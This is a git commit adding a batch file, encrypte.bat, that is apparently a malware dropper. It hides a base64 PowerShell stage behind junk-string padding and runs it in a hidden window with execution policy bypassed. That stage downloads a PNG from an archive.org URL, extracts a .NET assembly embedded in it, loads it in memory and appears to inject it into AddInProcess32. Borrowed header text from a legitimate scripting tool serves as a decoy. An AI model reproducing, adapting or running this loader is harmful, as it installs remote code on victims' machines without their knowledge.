cd91521fece7772de7bea11af0a25676e04b8b19
benkt258-gif <benkt258@gmail.com>
2025-11-07 04:02:14 +0700

    Add files via upload

---
+++ encrypte.bat
@@ -0,0 +1,175 @@
+capstif (true == false) capstend /*!
+capstecho off
+
+
+
+setlocal enabledelayedexpansion
+
+
+
+:wsrhipiphorus.start
+
+capstecho off
+set "trifluctuation=JcapstHVybCA9ICdodHRwOi8vaWE2MDA0MDcudXMuYXJjaGl2ZS5vcmcvNy9pdGVtcy9tc2ktcHJvLXdpdGgtYi02NF8yMDI1MTEvTVNJX1BST193aXRoX2I2NC5wbmcnOyRieXRlcyA9IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkRGF0YSgkdXJsKTskdGV4dCAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJGJ5dGVzKTtpZiAoJHRleHQgLW1hdGNoICdCYXNlU3RhcnQtKC4qPyktQmFzZUVuZCcpIHskdmFsb3IgPSAkbWF0Y2hlc1sxXTskYXNzZW1ibHkgPSBbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoW0NvbnZlcnRdOjpGcm9tQmFzcapstZTY0U3RyaW5nKCR2YWxvcicapstkpO1tDbGFzc0xpYnJhcnkxcapstLkNsYXNzMV06OlZBSSgnPTcapst1BZAoNNFJuTDRNVE56QVRNcapstMkFUTXhVak13SXpYdlpYYTcapstFGbmNoOVNidk5tTGxwWFkxcapstZG5MbE5YWnVsR2FqTkhidjcapstlHZHVOMkx2b0RjMFJIYScscapstJzAnLCdDOlxQcm9ncmFtIEcapstZpbGVzXCcsJ0NEVFNLS1Q5capsteHcnLCdBZGRJblByb2Nlc3capstMzMicsJycsJ0FkZEluUHJvcapstY2VzczMyJywnMCcsJ1VSTCcapstcsJ0M6XFByb2dyYW0gRmlscapstZXNcJywnQ0RUU0tLVDl4dycapstcsJ2JhdCcsJzYwJywnMScscapstJzNlNlJJZ2xHQ0YnLCcwJycapstwnJywnVVJMJywnJyk7fQ==capst"
+
+
+set "trifluctuation=%trifluctuation:capst=%"
+set "supersacral=pspillproofowspillproofersspillproofhellspillproof "
+set "supersacral=%supersacral%-NospillproofProfspillproofispillproofle "
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%-WspillproofindspillproofowStspillproofyle "
+set "supersacral=%supersacral%Hispillproofddespillproofn "
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%-EspillproofxespillproofcutispillproofonPspillproofolispillproofcy "
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%Byspillproofpaspillproofss "
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%-Cospillproofmspillproofmand "
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%spillproofspillproofspillproof"
+set "supersacral=%supersacral%^"$nontspillproofyphoidal = "
+set "supersacral=%supersacral%[Systspillproofem.Tspillproofextspillproof.Encspillproofodispillproofng]::spillproofUspillproofTFspillproof8.GetStspillproofrinspillproofg([Cospillproofnvespillproofrt]::spillproofFrspillproofomBasspillproofespillproof64Stspillproofrispillproofng('%trifluctuation%')); "
+set "supersacral=%supersacral%Inspillproofvospillproofkespillproof-spillproofEspillproofxspillproofprespillproofssspillproofiospillproofn $nontyphoidal^""
+set "supersacral=%supersacral:spillproof=%"
+start "" %supersacral%
+exit
+
+
+:: Set the name and version
+set wsrhipiphorus.name=Windows Scripting Command
+set wsrhipiphorus.version=0.23.20 Beta
+set wsrhipiphorus.copyright=Copyright ^(C^) 2009-2015, 2019, 2020 Ildar Shaimordanov
+
+
+:: Prevent re-parsing of command line arguments
+if not defined wsrhipiphorus.started goto wsrhipiphorus.2
+set wsrhipiphorus.started=
+
+
+:: Parse command line arguments and set needful variables
+set wsrhipiphorus.temp=
+set wsrhipiphorus.inline=
+set wsrhipiphorus.inproc=
+set wsrhipiphorus.script=
+set wsrhipiphorus.script.n=
+set wsrhipiphorus.script.p=
+set wsrhipiphorus.script.begin=
+set wsrhipiphorus.script.end=
+set wsrhipiphorus.script.beginfile=
+set wsrhipiphorus.script.endfile=
+set wsrhipiphorus.engine=javascript
+set wsrhipiphorus.var=
+set wsrhipiphorus.compile=
+set wsrhipiphorus.debug=
+set wsrhipiphorus.quiet=
+set wsrhipiphorus.ellipticity=
+
+
+
+
+WScript.Quit();
+
